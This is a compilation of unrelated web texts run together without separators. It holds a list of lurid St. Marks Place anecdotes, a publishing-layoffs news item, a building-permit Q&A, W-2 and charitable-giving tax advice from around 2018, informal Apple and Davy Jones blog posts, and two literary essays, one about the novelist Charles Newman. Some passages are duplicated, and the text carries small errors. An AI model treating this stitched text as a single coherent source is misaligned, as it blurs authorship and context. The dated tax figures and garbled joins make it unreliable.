I grew up there but didn’t know about some of the more notorious episodes I discovered researching “St. Marks Is Dead: The Many Lives of America’s Hippest Street” (W. W. Norton & Company), out this week. Some notable lowlights:
Daniel RakowitzRobert Miller
1. Cannibal stew. Pothead Daniel Rakowitz, who went everywhere with a live chicken, met a Swedish dancer in Tompkins Square Park, at the eastern end of St. Marks Place, and they moved in together. In 1989, he killed her and made her into a stew, then fed her to the homeless in the park.
2. High notes. Needles — for speed or heroin — have long been a St. Marks staple, nearly as ubiquitous as Big Gulps in other parts of the country. The film director John Waters recalls seeing the Velvet Underground at Andy Warhol’s Exploding Plastic Inevitable at 19-23 St. Marks Place in the mid-1960s. “They were shooting up onstage,” John Waters told me. “It may not have been real, but it looked real!”
3. Soooo many riots. Today people mostly remember the Tompkins Square Park Riots of 1988 and 1991, when anarchists, squatters and others fought police enforcement of the curfew. But St. Marks Place has always been a hotbed for protest. In the 1860s it was over the Civil War draft, in the 1870s anger over a tanked economy, in the 1960s Vietnam…
4. Going out with a bang. After years of vowing to commit suicide on stage, violent performance artist G.G. Allin played his last show at Lower East Side club the Gas Station in June 1993 and then, after banging his head against a lamppost until it bled and rolling naked in the street in front of oncoming traffic, got lost heading back to his hotel at 2 St. Marks, overdosed and died unceremoniously.

5. Gang that couldn’t shoot straight. In January 1914, brash Italian gangsters threw a party at Arlington Hall (19-23 St. Marks), the turf of Jewish gangster Dopey Benny Fein (so called because of his sleepy eyes). A gun battle killed a passing civil servant but managed to miss every one of the criminals involved in the attack.
The remnants of a rigged wall of the basement — from a man who ran a speakeasy during the Probition and needed a way to destroy the evidence. Don’t worry, there’s no longer a bomb there.Angel Chevrestt
6. Wired to explode. “Here you can see a single strand of copper wire that links all these together to a zip cord that goes to the magnetic switch for the bomb detonator,” says Lorcan Otway, the current owner of 80 St. Marks. He’s showing off the remnants of a rigged wall of the basement — the work, he says, of a man who ran a speakeasy there during Prohibition and needed a way to destroy the evidence. There’s no bomb anymore, but the wire remains.
7. Mr. Zero. A middle-aged civil servant from Canada reinvented himself as a Baha’i do-gooder named “Mr. Zero” who fed, clothed, and housed thousands of homeless people during the Depression. He opened a series of homeless shelters along St. Marks Place, including one at 33 St. Marks called The Tub, where he hung a baby bathtub over the door. He thought it was a fitting symbol for “a group half-naked of clothes and completely naked of money.”

8. Give me Liberty. On Dec. 23, 1974, a 30-year-old man named William Connell took two hostages at his three-room, second-floor apartment at 102 St. Marks. He had five rifles, a shotgun, six handguns, a mortar, more than 2,000 rounds of ammunition and four hand grenades. Detectives believed that he planned to blow up the Statue of Liberty. He was killed in a shootout at the apartment.
9. A tree grows in…In the late 1960s, St. Marks Place radicals on St. Marks staged a series of protests, including a “Hippie Bus Tour to Queens,” planting a tree in the middle of the street, and, at Abbie Hoffman’s apartment, inviting journalists to a demonstration of a potent (fake) new drug called “Lace.” At the press conference, those under the influence of “Lace” pretended to become uncontrollably aroused and had sex in front of reporters. Writer Paul Krassner said it was described as the drug that, when sprayed on policemen and soldiers, would actualize the saying “Make Love Not War.”
10. School for anarchists. On New Year’s Day 1911, Emma Goldman opened the Modern School at 6 St. Marks Place, designed to prepare children for a future without laws. This was after a failed attempt to assassinate industrialist Henry Clay Frick and before being kicked out of the country. State investigators closed the Modern School, saying, “That such an institution should have been allowed to exist for almost 10 years is not a very high compliment to the city of New York.”

Rodale added to its upheaval this week by axing 40 people, or about 5 percent of its workforce.
The publisher of Men’s Health, Women’s Health and Runner’s World has made the “painful but strategic decision to eliminate certain positions across the company,” a spokeswoman said.
“These changes were made to streamline our business operations and drive growth as we continue our transformation as a company; they are a proactive response to industry changes.”
Chairwoman Maria Rodale, the scion of the family-owned health and fitness publisher, took over day-to-day operations in October when Scott Schulman was forced out as president after a three-year run.
Last month, the company cut a number of group publishers in a 10-person downsizing and also shut down the Running Times. Earlier this week, it ousted Prevention editor-in-chief Bruce Kelley.

Dear Mr. Neuman.
Quick question: I live in a apartment building in the Bronx and the Landlord has added an extra bathroom in an apartment that originally had only one bathroom ever since the building was constructed and many other changes of the sort. In addition,he has also completely remodeled the Super’s basement apartment by changing the design completely. Does the Landlord need a permit and if so, does it need to be exposed?
Thanking you in advance for your help and assistance.
Gigi R.

Hi Gigi-
Thank you for your question. I’m unable to answer your question with authority as residential construction is not my area of expertise. Generally if you are adding plumbing and electrical that changes the original filing with the DOB, it would require permitting. I’m going to reach out to one of my expeditor colleagues Alan Cabello of AC Building Consultants to weigh in on this thread. Stay tuned.

Sometimes on Form W-2 the Social Security Wages (box 3) and Medicare Wages (box 5) are larger than the amount in box 1 (Wages) on Form W-2. You will notice when entering Form W-2 that boxes 3,4,5 and 6 auto fill. If you need to make changes to these boxes there are 2 ways to do so. First way is to click the bottom box in each section and make it match the W2 line by line. The second option is to enter the code and amount in box 12 (typically code D) and the software will then adjust those lines.
If you try to type in the "gray box" (calculated field) it will try to override the entry and cause a verify message.

Charitable Giving and Tax Reform
December 14, 2018 by Roger Wohlner 2 Comments
The Tax Cuts and Jobs Act passed in December of 2017 marks the biggest overhaul in the tax code in many years. One area that will be impacted under tax reform is charitable giving.
While charitable contributions remain eligible as an itemized deduction under tax reform, the ability to actually deduct your contributions may have been impacted by some changes in in the rules. Here are some thoughts for this holiday season and throughout the year.
Tax reform may impact your ability to itemize deductions including charitable contributions.
Click To Tweet
SALT Cap
SALT stands for state and local taxes. Tax reform capped the amount of these taxes that can be used as an itemized deduction at $10,000 for 2018 going forward. The two biggest SALT components for most people are their state income taxes and their property taxes. This will especially impact those people living in states with high income taxes and locations with high property values/property taxes. Many commentators say this was politically motivated since taxpayers in “blue states” seem to be disproportionately impacted, I’ll leave that to you the reader to decide.
Higher standard deduction
The other major change that may impact your ability to itemize deductions is the increase in the standard deduction. Starting in 2018, the standard deduction increases to $24,000 for those who are married filing jointly and $12,000 for single filers. This means that if your itemized deductions are less than these thresholds, you will be better off taking the standard deduction versus itemizing.
Note that these and most provisions under tax reform expire after the 2025 tax year, so we will see what the future holds for these and other provisions beyond that.
Deductibility of charitable contributions under tax reform
The deductibility of charitable contributions was not eliminated under tax reform, in fact it was expanded for some high-income taxpayers. The issue for many taxpayers is whether or not they can still itemize deductions with the changes to the standard deduction limits and the SALT cap discussed above.
For those whose situation might not allow them to itemize, here are some ways to make your charitable giving more tax-efficient.
Bunch contributions
Let’s say that you and your spouse file a joint return. In this example let’s say your mortgage interest is $10,000 for the year and your SALT taxes are capped at the $10,000 level. With other deductible expenses your itemized deductions would come to $21,500, leaving you $3,500 short of the $24,000 standard deduction threshold.
One option would be to bunch expenses that would qualify as itemized deductions into 2018 (or any appropriate year) to get over the $24,000 hurdle.
In the case of charitable contributions, you might consider making additional contributions in the current tax year to help your reach the threshold where you can itemize. If you normally would make contributions of $1,500 per year and can afford to do so, you might try to make 2-3 years’ worth of contributions to the organizations of your choice in the current year to get your deductions above the threshold.
Give appreciated securities or assets
Using appreciated securities held in a taxable account to make charitable contributions has long been an excellent method to make charitable contributions. Stocks, mutual funds and ETFs that have appreciated in value are good gifts. Other types of appreciated assets can be used as well, such as art, collectibles and real estate. These types of assets will need to have an appraisal to determine their value as a gift, versus using the market value on the day of the gift for appreciated securities.
There are two potential benefits:
The value of the gift can be deducted as a charitable contribution for those who can itemize deductions.
There are no capital gains taxes that will be due on the contributed shares. If you were to sell the shares first and then contribute the cash, you would owe capital gains taxes on the amount of the realized gain on the sale.
This strategy can also be used as part of your overall portfolio rebalancing, it can be a tax-efficient way to rebalance your holdings.
Even for those who cannot itemize under the new rules, the benefit of not having to pay taxes on the capital gains can be a significant benefit.
If you have a security that has declined in value, you are generally better off selling it, realizing a loss on the sale and then contributing the cash.
If this is a route that is appropriate for you, be sure to contact the organization to ensure that they can accept gifts of appreciated securities or other types of assets.
Using appreciated securities held in a taxable account to make charitable contributions has long been an excellent method to make charitable contributions.

Donor-advised funds
A donor-advised fund is a fund that allows you to have your contributions to the fund professionally managed, offering the opportunity to make contributions to qualified charitable organizations over time. DAFs have been around for many years and are offered by such big-name financial services organizations like Vanguard, Schwab and Fidelity among others.
After establishing your account, contributions to the DAF can be made via check, securities or other assets. The details may vary a bit from fund to fund.
The fund invests your contributions professionally, typically through a list of individual funds or several managed portfolios they might offer. The money grows, and contributions can be made over time to the organization(s) of your choosing, as long as they are qualified charities. Most DAFs have minimum initial and future contribution levels, as well as minimum donation levels.
DAFs fit well into the new tax environment in that they can accept appreciated securities and can be a great vehicle to bunch your contributions in order to be able to itemize in certain years. They also allow you to space out your charitable donations if your desire is to give a certain amount each year.

For those who are age 70 ½ or older, you can direct some or all of your required minimum distribution (RMD) to a qualified charitable organization each year in what is called a qualified charitable distribution (QCD). The limit is $100,000 annually.
The QCD has been around for a number of years. The amount directed to the charity is not taxed. This is beneficial for many reasons, including keeping your income in a range that offers the lowest future Medicare costs.
The amount of the QCD does not qualify as a deductible charitable contribution. If you have charitable intentions, this can be a tax-efficient way to make charitable.
The Bottom Line
Contributing to charity is a great thing to do for those of us who are able to do it. As a Jesuit priest told me back in my graduate school days at Marquette University, you might as well take any tax breaks possible when making donations. The ideas above can help make your contributions a bit more tax-efficient.
As with any tax or financial planning issue, be sure to consult with a qualified tax or financial professional to determine if these ideas make sense for your situation.

QDC is mentioned several times as acronym for “qualified charitable distribution”. QCD is more commonly used.

It’S An APPLE UNIVERSE …. We Just LIVE In IT !!!
The New iPad? What the Hell kind of name is that? People are wonder. A major blunder by Tim Cook. Come on Tim, what kind of name is that? People don’t know what to call it. Is it The iPad 3, The New iPad? What? Major questions are being raised. Prior to 10 Am California time yesterday the questions being asked where what the new iPad was going to be? Were the rumors correct, new high-resolution retina display a more powerful processor, better camera? Yes these all cam true. A cheaper 16 GB iPad 2 at $399. came true as well. The 7″ iPad not true. But the name Time? New iPad that’s gotta go. Maybe it will. Is this just a interim name? Will the name be changed once New iPads start physically going out to customers, or will this Crazy Name “The New iPad” remain? Yes, people are wondering.
Yes no major changes like the ability to increase GB with a SD slot or a USB port, two things people have been crying for but Apple with their Tyrannic Rule make you adhere to their Iron Rule and Control of The Apple Universe all in effort and success to grab as much of your money as possible and monopolize control. Apple is not gonna let you buy more Memory from Scandisk or any other company, they “Want It All” to themselves. Yes, Dictate and control, that’s Apple, like it or not, that’s the way it is.
Well, until the next iPad, 4 or what, iPhone 5 or what. It’s an Apple Universe and we only live in it.
“Da Da Dats All Folks” !!!!

iPad 3 or iPad HD
What’s Up Apple? What’s it gonna be, a new high resolution Retina Screen, more power, more memory, a better camera, thicker, thinner, Bigger, smaller? These are some of the questions being asked about Apple’s new iPad. Heck, it may not even be called the “iPad 3″ but The .. iPad HD. Whatever! Speculation that Apple will keep the iPad 2 and sell it for less with a 8GB version. Will there be a 7” iPad? Who knows? Apple….
Well it’s 12:30 PM in New York and 9:30 AM in Corpertino and San Francisco California where the big Apple Press Conference will take place and start in about 30 minutes from now. Million are on the edges of their Proverbial Seats in Anticipation, Carly Simons and Heinz Ketchup. Ha Haaa !!!!
What’s it gonna be Apple? The World wants to know. Well World, people we’re gonna know, in about 30 minutes from now.
PS, they also say that Apple may announce that they are making a TV. Yes a TV, not that little box thing but a full blown TV, The Apple TV. Well, we’ll see. The countdown is on, 24 Minutes from now and counting down. What’s it gonna be Apple? Huh?

DAVY JONES DIES … and We Lose Another
Yes, we’ve lost another great performer. Well some would beg to differ with me using the phrase great performer for Davy Jones. All except his millions of fans who grew up and loved him in their own ways. I was a young boy of the 60s and loved the Monkees. Mickey was my favorite, but I liked Davy as well and all the boys in there funny hi-jinx. The Monkees was my favorite show which I waited patiently for every Saturday morning for a few years of my youth.
Davy Jones died yesterday, aged 66 of heart attack. Makes me a little sad, such a big part of my childhood. Many girls around my age were madly in love with Davy the good looking lead singer of the band. Yes we are all adults now of middle age and of course you will get a little melancholy thinking back to youth, when you were a child and the things you loved and loved to do. And watching the Monkees was one of those things we loved. Yes most of the girls had crushed on Davy, some on Mickey and maybe a few on Peter or Michael, but without a doubt for the millions of young girls, most were madly In-Love with Davy Jones, the cutest Monkee, no doubt. maybe some guys wanted to be like Davy but probably more like Mickey or Mike.
Anyway, we’ve lost poor Davy and no doubt millions of women aged 45 to 65 are having their own little morning today and the next few. They’ve lost Davy and just a little bit more of there childhood and girlish crushes have disappeared. Life is that way. Davy, we’re sorry to see you go old pal, may you Rest in Peace, up there with Whitney, Amy, Jimi, Jim and Jim. God Bless You Davy, your memory will live on.
and maybe a few on Peter or Michael, but without a doubt for the millions of young girls, most were madly In-Love with Davy Jones, the cutest Monkee, no doubt. maybe some guys wanted to be like Davy but probably more like Mickey or Mike.

‘A Walk in the Woods’ vs. A Walk in the Woods: On Reading as a Substitute for Experience

In the summer of 2000, two friends and I embarked on an epic cross-country drive. In preparation for the journey, we rented a Dodge Caravan, stocked up on peanut butter, and debated where to go. Using a Rand McNally map book, I laid out our path in pen, drawing lines from campsite icon to campsite icon across America and back. We planned to leave from Delaware, where I was a senior in college, in late June, and return in mid-August — in all, six weeks of whiskey-addled, open-skied adventure. For the quiet moments — of which there turned out to be few — I brought along a worn copy of The Grapes of Wrath. Like the Joads, we were also striving for California — but with more Led Zeppelin CDs in tow.
That month and a half became one of the fullest periods of my life, with one exhilarating escapade after another: outracing tornadoes in Kansas, nearly freezing to death in Yosemite, close calls with bears in both Sequoia and Glacier National Parks. We hiked and camped and ate our peanut butter. With cheap snapshot cameras, we ran through dozens of rolls of film. From Seattle to Pittsburgh, we forswore bathing, a foul contest of wills. It was all very stupid and perfectly glorious. It was, as they say, a formative experience.
Afterwards, we made a pact to do a similar expedition every year, but outside of a few days in West Virginia in 2001, our oath died on the vine. As I progressed through my 20s, though, I still thought of myself as the same daring moron who once pushed a minivan to 110 on a Montana interstate. My girlfriend and I would go on long drives just to see what we could see; we hiked with the same questing spirit I’d carried on my trip. Once, in New Jersey’s Pine Barrens, we became covered in deer ticks — and as we scraped them from our shins, laughing in horror beside our car, I had the feeling that, uncomfortable as I was, I remained on the proper track. You can’t get covered in bugs if you don’t enter the woods.
As time went on, I began to read about people who, I flattered myself to think, had a similarly — if more pronounced — searching spirit. There was Percy Fawcett of The Lost City of Z, who rambled through the Amazon as if it were Central Park. And Into the Wild’s Chris McCandless, whose fatal Alaskan trek was equally noble and misguided. I became a sucker for such narratives, subscribing to Outside magazine for its pieces on doomed hikers and wayward canoeists. Most know Christopher McDougall’s Born to Run for the creepy 10-toe running shoes it helped to popularize, but I was more taken by its description of Mexico’s Tarahumara and their daunting mountain races. To write Savage Harvest, about the 1961 disappearance of Michael Rockefeller, Carl Hoffman traveled to New Guinea — just as I would have done, I thought as I read. After all, I was pretty intrepid myself.
Except that I wasn’t; not anymore. I was now married to that girlfriend, and had become both a father and an eternally fatigued commuter. Any journey I now took was occurring inside my skull: instead of going on spontaneous road trips, I was reading Charles Portis’s Norwood. Instead of hiking until my feet bled, I was reading Bill Bryson’s A Walk in the Woods. Instead of tearing across Montana, I was reading Jonathan Raban’s Bad Land. I had outsourced the work of outdoor experience to various authors, my risk limited to paper cuts and coffee spills. It had happened slowly, imperceptibly, until the transformation was all but complete. The version of myself who “got out there and did things” had been replaced by a softer, safer, far more boring person.
In short, I was spending too much time reading about interesting people and almost no time being one — an insight that recently hit me with depressing force. I’m not sure what spurred the revelation — perhaps it was the contrast between the solitude of reading and the chaos of what I read. Maybe it struck me that I’d just read two books about people surviving deadly cold (Crazy for the Storm, The Shining) and was, absurdly, preparing to read two more (The Revenant and Alone on the Ice). Whatever it was, I’d become unhealthily comfortable; to quote an old Radiohead song, I was now a pig in a cage on antibiotics — or, less dramatically, a guy in cozy slippers whose vitality had slipped away.
This suspicion was soon confirmed by a family hike — the first my wife and I had been on in years, despite the fact that the woods are a short drive from our house. Though we only walked for two hours or so, and the air was getting cold, the forest quietly filled a need that, in recent years, I had learned to ignore. We marveled at trees that intertwined like rope, gazed at a creek as if it were a national landmark. We inhaled, exhaled, looked for the paint blazes that marked our path. We were again away from everything, and it felt really fucking good.
That was a month and a half ago, and that feeling — the recognition of some innate inner need — hasn’t faded; it now seems to burn within me, steady as a pilot light. I’ve resolved to reclaim myself — my old self, tick-stippled and chased by bears, a person who’d do most anything for the sake of doing it. In a way, it’s already happened; we’ve since gone on another such hike, and we’re planning a what-the-hell-let’s-just-go trip to Tennessee in the spring. Reading is an incredible thing, but it’s a poor substitute for life. I’m amazed, and embarrassed, that I’ve had to learn such an obvious lesson. Yes, adulthood is tiring, children will suck you dry, and it’s easy to stay inside. But I remember now: though I packed The Grapes of Wrath on that long-ago, six-week drive, I read almost none of it. And I didn’t miss it at all.

Uncle Charlie Newman and the Impossible Novel
Essays
Ben Ryder Howe March 14, 2013 | 12 books mentioned 7 14 min read
“Is it a book then . . . that you’re working on?”
“I wouldn’t call it a book, really,” Felix replied evenly, his knuckles white on the balcony railing.
“But through all our talks, you’ve never once mentioned it!” the Professor, now truly hurt, blurted mournfully. “How can that be?” Then the question authors dread above all others: “Pray, what’s it about?”
1.
In the summer of 1989, my uncle, the novelist Charles Newman, rented a cottage near the weekend home my parents owned on Cape Cod. Uncle Charlie, as I was still absurdly in the habit of calling him as an 18-year-old, was out of place on the Cape — he avoided the water and lacked a family to indulge at the ubiquitous drive-ins and miniature golf courses. The brand-new black Acura Legacy with gold trim that he had driven all the way from St. Louis, its trunk packed full of high-potency multivitamins and Mahler CDs, stood parked all summer in the cottage’s white, sandy driveway like a rebuke to the entire peninsula. I never went inside the cottage. My mother had instructed me to not even drive down the street when Charlie was working, which was always, and to never under any circumstances ask what he was working on. After the summer ended, though, we inferred that it had been productive. Charlie was sober, stable, and had been quiet most of the time. Whatever he was creating inside the cottage, as long as it came out soon, would meet his usual publication schedule of a book every few years.
At 51, Charlie was nearing the pinnacle of his strange but just-as-he-would-have-it career. Not that he cared about reputation, or so he claimed, but only a few years earlier he had produced a volume of essays, The Post-Modern Aura, which despite being called “Hegelian” for its “daunting” prose and “exquisitely complex argument,” had been something of a sensation for a work of literary criticism, garnering euphoric reviews (“Brilliant,” “Scathing,” “Brilliant,” “Relentless,” “Brilliant,” “Brilliant,” “Brilliant”) in one newspaper or magazine after another. His previous novel, White Jazz, had been a New York Times book of the year and bestseller. Outside of writing, though still trapped in the emasculating, brain-deadening torture chamber of academia, he was in the best position he had ever known to maximize his output, having somehow, despite a record of adversarial relations with previous employers, secured a plummy professorship at Washington University, home to one of the best writing programs in the country, where he taught little and no longer had to edit for a living. (For years Charlie had been the editor of TriQuarterly, where, as a junior professor at Northwestern in his 20s, he accomplished the dream of every small-time lit mag editor in the world: turning a no-name campus rag into a vehicle for Nabokov, Borges, and Calvino.)
Most important, his writing powers were at their peak, at least in theory. Looking back at his prose from that period, you can see that “the long line” he’d pursued for so long had finally come to him, whether because he’d found the right form to pursue it in (“Every writer has to find their form,” Charlie would often say, his own journey having taken him from the personal essay to cultural criticism and both minimalist and maximalist fiction, though I suspected that his real métier was The Angry Letter: the denunciatory, bridge-burning screed), because he’d stopped drinking, or something more mysterious.
Don’t ask what your uncle is writing about — but I was 18 at the time, the age at which being told “Don’t do something” makes it impossible to do anything but. One day, a few months after that summer on the Cape, while visiting Charlie in St. Louis, I waited until he went to campus and tiptoed upstairs to his office.
Charlie’s goal when he started each day was to come up with one or two, possibly three sentences he liked, and to get there he wrote out his drafts by hand, then sent the pages to an assistant, who returned them typewritten on plain white sheets, which Charlie then cut into slivers, isolating individual sentences before reinserting them with Scotch tape in the handwritten notebooks, or tacking them to a wall. Those tacked-up sentence slivers were before me now, along with dozens if not hundreds of pink and yellow note cards scrawled with riffs, phrases, lists, and snatches of dialogue. The book, in other words, was in front of my face — no drawers had to be opened, no papers rifled through. The office itself was surprisingly clean and uncluttered, aside from 50 or so briarwood pipes and an astonishing number of overdue library books.
I stayed in the office until the Acura pulled in the driveway an hour or so later, by which time I still had no idea what the book was about. Charlie’s kinetic shorthand was often indecipherable even to assistants who had worked with him for years, and as for the sentences that had been typed out, they were typically fragments (“army of deserters,” “mad for sanity”) or mystical pronouncements such as “History has a way of happening a little later than you think” or “In Russia you always have to buy the horse twice.” Sometimes they contained no more than a single word. (“Deungulate.”)
However, the question also has to be asked: Even if I had found some synopsis for the novel-in-progress, what difference would it have made? Charlie’s books tended to thwart summary. How, for example, would you distill the plot of White Jazz? (“Sandy, a young man who works for an information technology company, sleeps around”?) How would you describe the subject of The Post-Modern Aura: art? Literature? History? Or simply the abjectness of the human condition? Even sympathetic readers often found themselves struggling to say what Charlie’s books were about. (Paul West, attempting to describe the novel The Promisekeeper in a 1968 review for The Times, called it “not so much a story as an exhibition, not so much a prophecy stunt as a stunted process, not so much a black comedy as a kaleidoscopic psychodrama.”)
2.
Over the next several years, Charlie continued to work on his mysterious book in St. Louis and New York (where he lived when he wasn’t teaching), as well as various parts of Europe, Russia, and the U.S. He and my parents frequently traveled together; all of us sat with him in restaurants and walked through museums in places like Santa Fe, Chicago, and Kansas City and did everything possible to avoid asking — to not even think about — the question we most wanted to ask.
But then a surprising thing happened: Charlie began to talk about the book. I can’t exactly remember when it became clear that he was not going to lunge across the table if we brought it up, but some part of him softened, something opened up, and if you weren’t inelegant about it (“The worst kind of mistake[is] not a moral but an aesthetical one,” Charlie would write, not jokingly) you could extract a few details — which of course weren’t always that enlightening.
“It’s the great un-American novel,” he would say in a cheerful mood, or “It’s a novel for people who hate novels, a novel pretending to be a memoir that’s really a history” — or something like that. Sometimes he would go on at length, easefully sketching out major characters, including the most important character of all, “Cannonia,” the invented country in which the book was set. Sometimes he would simply say “it’s indescribable — nothing like it has ever been written.” Then there’d be nothing but one of Charlie’s “special repertoire of silences” hovering about the table, until eventually the conversation moved on.
The openness could have been reassuring, a sign that Charlie was on top of his book and didn’t fear talking it away. The more he spoke, though, the more I worried, in part because the book he was describing sounded not just indescribable but unwriteable. First, there was its premise: Charlie said he was going to write the history of a place which did not exist but wherein virtually everything described — characters, events, locales — was real, drawn from actual sources. That alone explained why the book was taking so long: Charlie had obviously gotten bogged down in research. (A grant proposal I later discovered listed his primary texts as “obscure diaries, self-serving memoirs, justifiably forgotten novels, carping correspondence, partisan social and diplomatic histories, black folktales and bright feuilletons.”) But it wasn’t the only reason to be nervous; there was also Charlie’s intention to somehow merge his fake-but-real history with a spy thriller, a cold war novel of suspense. Was such a book even possible? Wasn’t a spy thriller supposed to be brisk and plotted, and history (even pseudo-history) ruminative and disjointed? How would you blend the two genres? And then there was Charlie’s insistence that the book, despite its writerly ambitions, would somehow be “accessible and commercially viable,” containing not one but “several” movies. This seemed least fathomable of all — the most uncompromising writer ever, bowing to conventional taste? Altogether the project seemed impossible, even for Charlie, who once vowed to “write books that no one else could write” and who would have rather changed careers than give up experimenting.
3.
About eight years later and a month or so after Charlie’s death in 2006, I went back to his office — not the one I’d trespassed in in St. Louis but the one in New York, which was in a gloomily black-windowed high-rise on West 61st Street called The Alfred. The space was as Charlie had left it before he died, and at the bottom of a closet, underneath an assortment of dirty blankets, Italian suits, and hunting clothes, I found an old television still murmuring, its picture tube faintly aglow. It had been five months since Charlie was there, but I had the sense that the inflamed set had been attempting its manic, muffled communication even longer. The clothes inside the closet were as hot as if they’d just been ironed.
Unlike the office I had been in 15 years earlier, this one was squalid, cluttered with foldable picnic tables, overstuffed vinyl chairs, and still-running air purifiers blackened by pipe tobacco. The couches were stained and burnt. Every level surface was covered with manuscript pages, newsletters from financial “gurus,” and advertisements for eternal life potions. The entire Central European history and literature sections of the Washington University library seemed to be on hand, plus hundreds of books on espionage and psychoanalysis. I made a list of titles near Charlie’s desk: Freud and Cocaine, Were-Wolf and Vampire in Romania, Escape from the CIA, A Lycanthropy Reader, Mind Food and Smart Pills.
Back in the 1990s, when Charlie moved into the Alfred, the feature of his apartment he had been proudest of was a custom-built series of cubbyholes spanning one entire wall, which he would use to organize the Cannonia manuscript. Like his openness when discussing the book, the shelves had a reassuring aspect — after all, they were finite (you could see where they ended) and therefore so must be the book!
But the actual filing system I discovered after Charlie’s death bespoke madness, the cubbyholes having been filled with household items that had nothing to do with Cannonia. Instead, the manuscript was stored in dozens of sealed Federal Express boxes which had apparently been sent back and forth from New York to St. Louis and vice versa — draft after draft after draft after draft, so many it was impossible to tell which was most recent. The boxes, many of them having been taped shut years ago and never reopened, piled up under the plastic picnic tables. Also in the apartment were hundreds of sealed manila envelopes containing those cut-out, typed-up sentences — “Angry hope is what drives the world,” “He had brains but not too many,” “Women fight only to kill” — which it appeared Charlie had also been mailing, one tiny sliver per envelope, whether to an assistant or himself wasn’t clear.
Charlie had several helpers at The Alfred — unofficially, the doormen, who knew he only left the building to go to the Greek diner two blocks away, and to call the diner’s manager when he did to make sure he arrived. There was also a young woman he had hired to fix his virus-flooded Gateway and provide data entry — in the office I found her flyer with its number circled, the services it advertised including not only computer repair but martial arts instruction and guitar lessons. I met her a few times after Charlie’s death and we talked about the book, which she claimed Charlie had finally finished. “I know because we wrote it together,” she said. “He thought up the ideas for the scenes and I wrote them.” But she never showed me the completed, final manuscript, and a few weeks after we met she stopped returning calls.
4.
Here is the story of Charlie’s book, I think. In the 1980s Charlie wrote a novel, the story of Felix, a bankrupt “breaker of crazy dogs and vicious horses,” and the Professor, a certain Viennese psychoanalyst who brings Felix neurotic animals and theories of the mind. This modestly-sized, thoroughly old-fashioned book “split the middle,” to use one of Charlie’s favorite phrases, between fantasy and autobiography — Charlie, of course, being neither a Central European aristocrat living on an abandoned royal hunting preserve (as Felix is), nor an acquaintance of Freud. He was, however, a one-time breeder of hunting dogs who owned a kennel and horse farm in one of the most isolated parts of Appalachia, where, like Felix, he imported exotic plant specimens and found a way to escape the academic-literary-intellectual world he loathed. Losing the farm, as he did in the mid-1980s (to inflation, as he described it — inflation also being the scourge of several of Charlie’s books, it is worth noting), was surely the novel’s impetus.
“I wanted to write a long novel about the farm,” he once told an interviewer, “but the farm was so hurtful to me in many ways, not only economically but in terms of the loss of beloved animals,” as well as what he called a “nineteenth-century” existence.” So he wrote a short novel instead, one that was a throwback as much as the farm. In many ways it is a response — positive and hopeful, for all the unhappiness it apparently came out of — to the wrenching blankness of White Jazz and The Post-Modern Aura, works that depict spiritual suffering (“a vast cultural sadness,” in Charlie’s words) in an age of multiple, overlapping determinisms. For if nothing else, Felix lives in a world where his own agency matters, and where meaningful connections — with his wife, his animals, the Professor, and perhaps above all the land he lives on — are possible.
Charlie could have published the story of Felix and the Professor in the early ’90s, roughly maintaining his schedule of a book every few years. But one of Charlie’s idiosyncrasies as a writer is that he would often write something, then put it aside, and years or even decades later find some unexpected way to combine it with other, different material. In the case of the book inspired by the farm, he decided to hold off in favor of incorporating it within a massively enlarged work to be harvested from the book’s fantastical setting — Cannonia. Now instead of one book there would be roughly nine, divided into three volumes, all to be published at the same time. (“No dribbling out,” he growled when I asked if he would consider publishing even a little of the material before he’d reached the end.)
Having thus re-envisioned his tidy coastal steamer as a three-decker battleship, Charlie set out to write an introduction of suitable vastness, providing centuries of background and introducing characters who would not reappear for thousands of pages. The nature of the project all but required him to take this world-building approach. The story itself could wait. Characters could get away with announcing themselves in the grandest possible manner, then vanish. Charlie’s passion for history and obscure primary sources could be indulged. It was all part of the excitement, the buildup, the setting of an appropriate tone.
Ten years later, Charlie was still writing the overture to his symphony. And not surprisingly, the time it was taking, plus the future amount of work he could surely see coming, not to mention the embarrassment of attempting such a behemoth, weighed on him visibly. A lifelong alcoholic who frequently stunned even the people who knew him best with his capacity for self-destruction and recovery, Charlie had curtailed his drinking in the 1980s through Alcoholics Anonymous and sheer white-knuckle effort, then lost control in the ’90s, undoubtedly in part due to the stress of Cannonia. Toward the end of the decade his nervous system began to break down, and he spent much of the following years in the hospital, where doctors at first thought he might have suffered a stroke or the onset of Parkinson’s. Intermittently unable to speak or walk, he put aside the trilogy for long stretches, struggled with depression, and when the wherewithal to write eventually returned, started a pair of new books instead, a history of American education and a long essay on terrorism. He also became estranged from family, saw his fourth and final marriage end (“Why do people fear dying alone and unloved?” he had already written at this point, glimpsing the future. “What difference does it make?”) and reduced his teaching to the point where he was scarcely seen on campus.
During these years Charlie seemed to answer conflictingly every time he was asked if the book was done. In 1998, it was three-quarters finished, in 2005, only two-thirds, while in 2002 it was complete. His assistant in St. Louis believed he might never stop rearranging the table of contents and inserting new pages, and in fact he never did.
5.
The first time I read a draft of In Partial Disgrace, Charlie was still alive, and reading it all but put me into despair, not only for Charlie but at the idea any writer could suffer the kind of delusion he’d suffered so long. Page after page after page, there was nothing but setting or background. Cannonia, “our ineffable tragi-comic protagonist, superior to tragedy,” a country that is “effectively all border” and usually covered on maps by the compass sign or coat-of-arms, its natives standing guard over a mystical redoubt where Europe’s vanished species, such as the Tarpan horse and auroch, still thrive, was certainly a magical-sounding place, but it appeared one in which things only happened, usually in the distant past—there was virtually no present, no now. In many passages Charlie’s powers as a writer, rather than being at their peak, seemed to have dribbled out of him after all. How could an author who once wrote this:
“In front, as usual, were the graduate students, dressed in the russet, olive, beige and black of phlegmatic earnestness. Further back, spilling into the aisles, sprawled the gaudier, paisleyed and striped undergraduates, umbrellas and rainwear steaming in piles at their feet. In the balcony he could make out what must have been a visiting high school band class, restless, jaunty; girls smoothing tartan skirts about their knees, in serried rows assembled. How he loved girls who wore high socks.” (The Five-Thousandth Baritone)
and this:
“So it was that the Sandman had an inkling of Modern Revenge. The lost self, a bit of sugar in the gas tank. To the degree he had forgotten, he was.” (White Jazz)
think seriously of publishing turds like “the muse is mostly merciless” and “misconstruction makes the morning coffee”? I was confused also because so much of the novel Charlie had talked about for so long seemed missing. Where was Freud? Where was Pavlov? Where were the battle scenes, and where were the spooks? After 400 pages I put it down — obviously I held only a fragment of the overall work to come, and there was nothing to do but wait.
